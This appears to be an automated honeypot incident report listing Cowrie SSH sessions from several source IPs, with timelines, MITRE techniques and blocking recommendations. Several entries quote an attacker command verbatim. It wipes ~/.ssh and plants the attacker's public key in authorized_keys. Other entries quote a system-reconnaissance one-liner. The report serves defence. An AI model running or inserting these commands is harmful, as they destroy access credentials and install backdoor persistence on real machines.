| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:56:51` | `cowrie.session.connect` |
| `2026-03-15 02:56:51` | `cowrie.client.version` |
| `2026-03-15 02:56:51` | `cowrie.client.kex` |
| `2026-03-15 02:56:53` | `cowrie.login.success` |
| `2026-03-15 02:56:54` | `cowrie.session.params` |
| `2026-03-15 02:56:54` | `cowrie.command.input` |
| `2026-03-15 02:56:54` | `cowrie.command.failed` |
| `2026-03-15 02:56:54` | `cowrie.log.closed` |
| `2026-03-15 02:56:55` | `cowrie.session.params` |
| `2026-03-15 02:56:55` | `cowrie.command.input` |
| `2026-03-15 02:56:55` | `cowrie.session.file_download` |
| `2026-03-15 02:56:55` | `cowrie.log.closed` |
| `2026-03-15 02:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.183.192[.]58` to AbuseIPDB if not already reported
- [ ] Block `179.183.192[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68646fc61925

| Field | Detail |
|---|---|
| **Source IP** | `179.183.192[.]58` |
| **First Seen** | 2026-03-15 02:56 |
| **Last Seen** | 2026-03-15 02:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:56:59` | `cowrie.session.connect` |
| `2026-03-15 02:56:59` | `cowrie.client.version` |
| `2026-03-15 02:56:59` | `cowrie.client.kex` |
| `2026-03-15 02:57:00` | `cowrie.login.success` |
| `2026-03-15 02:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.183.192[.]58` to AbuseIPDB if not already reported
- [ ] Block `179.183.192[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82e4fcefc4fa

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]245` |
| **First Seen** | 2026-03-15 04:49 |
| **Last Seen** | 2026-03-15 04:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 04:49:21` | `cowrie.session.connect` |
| `2026-03-15 04:49:21` | `cowrie.client.version` |
| `2026-03-15 04:49:21` | `cowrie.client.kex` |
| `2026-03-15 04:49:22` | `cowrie.login.success` |
| `2026-03-15 04:49:22` | `cowrie.session.params` |
| `2026-03-15 04:49:22` | `cowrie.command.input` |
| `2026-03-15 04:49:22` | `cowrie.command.failed` |
| `2026-03-15 04:49:22` | `cowrie.log.closed` |
| `2026-03-15 04:49:23` | `cowrie.session.params` |
| `2026-03-15 04:49:23` | `cowrie.command.input` |
| `2026-03-15 04:49:23` | `cowrie.session.file_download` |
| `2026-03-15 04:49:23` | `cowrie.log.closed` |
| `2026-03-15 04:49:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]245` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3210f4733164

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]245` |
| **First Seen** | 2026-03-15 04:49 |
| **Last Seen** | 2026-03-15 04:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 04:49:25` | `cowrie.session.connect` |
| `2026-03-15 04:49:25` | `cowrie.client.version` |
| `2026-03-15 04:49:25` | `cowrie.client.kex` |
| `2026-03-15 04:49:25` | `cowrie.login.success` |
| `2026-03-15 04:49:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]245` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71efbd87a697

| Field | Detail |
|---|---|
| **Source IP** | `206.189.138[.]45` |
| **First Seen** | 2026-03-15 05:00 |
| **Last Seen** | 2026-03-15 05:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:00:27` | `cowrie.session.connect` |
| `2026-03-15 05:00:27` | `cowrie.client.version` |
| `2026-03-15 05:00:27` | `cowrie.client.kex` |
| `2026-03-15 05:00:28` | `cowrie.login.success` |
| `2026-03-15 05:00:28` | `cowrie.session.params` |
| `2026-03-15 05:00:28` | `cowrie.command.input` |
| `2026-03-15 05:00:28` | `cowrie.command.input` |
| `2026-03-15 05:00:28` | `cowrie.command.input` |
| `2026-03-15 05:00:28` | `cowrie.command.input` |
| `2026-03-15 05:00:29` | `cowrie.log.closed` |
| `2026-03-15 05:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.138[.]45` to AbuseIPDB if not already reported
- [ ] Block `206.189.138[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd7fc74241e1

| Field | Detail |
|---|---|
| **Source IP** | `206.189.138[.]45` |
| **First Seen** | 2026-03-15 05:01 |
| **Last Seen** | 2026-03-15 05:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:01:07` | `cowrie.session.connect` |
| `2026-03-15 05:01:08` | `cowrie.client.version` |
| `2026-03-15 05:01:08` | `cowrie.client.kex` |
| `2026-03-15 05:01:09` | `cowrie.login.success` |
| `2026-03-15 05:01:09` | `cowrie.session.params` |
| `2026-03-15 05:01:09` | `cowrie.command.input` |
| `2026-03-15 05:01:09` | `cowrie.command.input` |
| `2026-03-15 05:01:09` | `cowrie.command.input` |
| `2026-03-15 05:01:09` | `cowrie.command.input` |
| `2026-03-15 05:01:10` | `cowrie.log.closed` |
| `2026-03-15 05:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.138[.]45` to AbuseIPDB if not already reported
- [ ] Block `206.189.138[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baf944dce123

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]245` |
| **First Seen** | 2026-03-15 05:01 |
| **Last Seen** | 2026-03-15 05:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:01:26` | `cowrie.session.connect` |
| `2026-03-15 05:01:26` | `cowrie.client.version` |
| `2026-03-15 05:01:26` | `cowrie.client.kex` |
| `2026-03-15 05:01:27` | `cowrie.login.success` |
| `2026-03-15 05:01:27` | `cowrie.session.params` |
| `2026-03-15 05:01:27` | `cowrie.command.input` |
| `2026-03-15 05:01:27` | `cowrie.command.failed` |
| `2026-03-15 05:01:27` | `cowrie.log.closed` |
| `2026-03-15 05:01:28` | `cowrie.session.params` |
| `2026-03-15 05:01:28` | `cowrie.command.input` |
| `2026-03-15 05:01:28` | `cowrie.session.file_download` |
| `2026-03-15 05:01:28` | `cowrie.log.closed` |
| `2026-03-15 05:01:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]245` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f4be7fcf407

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]245` |
| **First Seen** | 2026-03-15 05:01 |
| **Last Seen** | 2026-03-15 05:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:01:29` | `cowrie.session.connect` |
| `2026-03-15 05:01:29` | `cowrie.client.version` |
| `2026-03-15 05:01:30` | `cowrie.client.kex` |
| `2026-03-15 05:01:30` | `cowrie.login.success` |
| `2026-03-15 05:01:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]245` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d7921057b67

| Field | Detail |
|---|---|
| **Source IP** | `206.189.138[.]45` |
| **First Seen** | 2026-03-15 05:01 |
| **Last Seen** | 2026-03-15 05:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:01:47` | `cowrie.session.connect` |
| `2026-03-15 05:01:47` | `cowrie.client.version` |
| `2026-03-15 05:01:47` | `cowrie.client.kex` |
| `2026-03-15 05:01:48` | `cowrie.login.success` |
| `2026-03-15 05:01:49` | `cowrie.session.params` |
| `2026-03-15 05:01:49` | `cowrie.command.input` |
| `2026-03-15 05:01:49` | `cowrie.command.input` |
| `2026-03-15 05:01:49` | `cowrie.command.input` |
| `2026-03-15 05:01:49` | `cowrie.command.input` |
| `2026-03-15 05:01:49` | `cowrie.log.closed` |
| `2026-03-15 05:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.138[.]45` to AbuseIPDB if not already reported
- [ ] Block `206.189.138[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9df19c267bfb

| Field | Detail |
|---|---|
| **Source IP** | `206.189.138[.]45` |
| **First Seen** | 2026-03-15 05:02 |
| **Last Seen** | 2026-03-15 05:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:02:26` | `cowrie.session.connect` |
| `2026-03-15 05:02:27` | `cowrie.client.version` |
| `2026-03-15 05:02:27` | `cowrie.client.kex` |
| `2026-03-15 05:02:28` | `cowrie.login.success` |
| `2026-03-15 05:02:28` | `cowrie.session.params` |
| `2026-03-15 05:02:28` | `cowrie.command.input` |
| `2026-03-15 05:02:28` | `cowrie.command.input` |
| `2026-03-15 05:02:28` | `cowrie.command.input` |
| `2026-03-15 05:02:28` | `cowrie.command.input` |
| `2026-03-15 05:02:29` | `cowrie.log.closed` |
| `2026-03-15 05:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.138[.]45` to AbuseIPDB if not already reported
- [ ] Block `206.189.138[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aedd2240550f

| Field | Detail |
|---|---|
| **Source IP** | `206.189.138[.]45` |
| **First Seen** | 2026-03-15 05:03 |
| **Last Seen** | 2026-03-15 05:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:03:05` | `cowrie.session.connect` |
| `2026-03-15 05:03:05` | `cowrie.client.version` |
| `2026-03-15 05:03:05` | `cowrie.client.kex` |
| `2026-03-15 05:03:06` | `cowrie.login.success` |
| `2026-03-15 05:03:06` | `cowrie.session.params` |
| `2026-03-15 05:03:06` | `cowrie.command.input` |
| `2026-03-15 05:03:06` | `cowrie.command.input` |
| `2026-03-15 05:03:06` | `cowrie.command.input` |
| `2026-03-15 05:03:06` | `cowrie.command.input` |
| `2026-03-15 05:03:07` | `cowrie.log.closed` |
| `2026-03-15 05:03:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.138[.]45` to AbuseIPDB if not already reported
- [ ] Block `206.189.138[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffa3cdf7587e

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]245` |
| **First Seen** | 2026-03-15 05:03 |
| **Last Seen** | 2026-03-15 05:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:03:27` | `cowrie.session.connect` |
| `2026-03-15 05:03:27` | `cowrie.client.version` |
| `2026-03-15 05:03:27` | `cowrie.client.kex` |
| `2026-03-15 05:03:28` | `cowrie.login.success` |
| `2026-03-15 05:03:28` | `cowrie.session.params` |
| `2026-03-15 05:03:28` | `cowrie.command.input` |
| `2026-03-15 05:03:28` | `cowrie.command.failed` |
| `2026-03-15 05:03:28` | `cowrie.log.closed` |
| `2026-03-15 05:03:28` | `cowrie.session.params` |
| `2026-03-15 05:03:28` | `cowrie.command.input` |
| `2026-03-15 05:03:28` | `cowrie.session.file_download` |
| `2026-03-15 05:03:28` | `cowrie.log.closed` |
| `2026-03-15 05:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]245` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-658c8f276d6f

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]245` |
| **First Seen** | 2026-03-15 05:03 |
| **Last Seen** | 2026-03-15 05:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:03:30` | `cowrie.session.connect` |
| `2026-03-15 05:03:30` | `cowrie.client.version` |
| `2026-03-15 05:03:30` | `cowrie.client.kex` |
| `2026-03-15 05:03:31` | `cowrie.login.success` |
| `2026-03-15 05:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]245` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df88dd4bfc7b

| Field | Detail |
|---|---|
| **Source IP** | `206.189.138[.]45` |
| **First Seen** | 2026-03-15 05:03 |
| **Last Seen** | 2026-03-15 05:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:03:43` | `cowrie.session.connect` |
| `2026-03-15 05:03:43` | `cowrie.client.version` |
| `2026-03-15 05:03:43` | `cowrie.client.kex` |
| `2026-03-15 05:03:44` | `cowrie.login.success` |
| `2026-03-15 05:03:45` | `cowrie.session.params` |
| `2026-03-15 05:03:45` | `cowrie.command.input` |
| `2026-03-15 05:03:45` | `cowrie.command.input` |
| `2026-03-15 05:03:45` | `cowrie.command.input` |
| `2026-03-15 05:03:45` | `cowrie.command.input` |
| `2026-03-15 05:03:45` | `cowrie.log.closed` |
| `2026-03-15 05:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.138[.]45` to AbuseIPDB if not already reported
- [ ] Block `206.189.138[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f4c57f0f181

| Field | Detail |
|---|---|
| **Source IP** | `206.189.138[.]45` |
| **First Seen** | 2026-03-15 05:04 |
| **Last Seen** | 2026-03-15 05:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:04:25` | `cowrie.session.connect` |
| `2026-03-15 05:04:25` | `cowrie.client.version` |
| `2026-03-15 05:04:25` | `cowrie.client.kex` |
| `2026-03-15 05:04:25` | `cowrie.login.success` |
| `2026-03-15 05:04:25` | `cowrie.session.params` |
| `2026-03-15 05:04:25` | `cowrie.command.input` |
| `2026-03-15 05:04:25` | `cowrie.command.input` |
| `2026-03-15 05:04:25` | `cowrie.command.input` |
| `2026-03-15 05:04:25` | `cowrie.command.input` |
| `2026-03-15 05:04:25` | `cowrie.log.closed` |
| `2026-03-15 05:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.138[.]45` to AbuseIPDB if not already reported
- [ ] Block `206.189.138[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18f4316faaca

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]37` |
| **First Seen** | 2026-03-15 05:07 |
| **Last Seen** | 2026-03-15 05:12 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

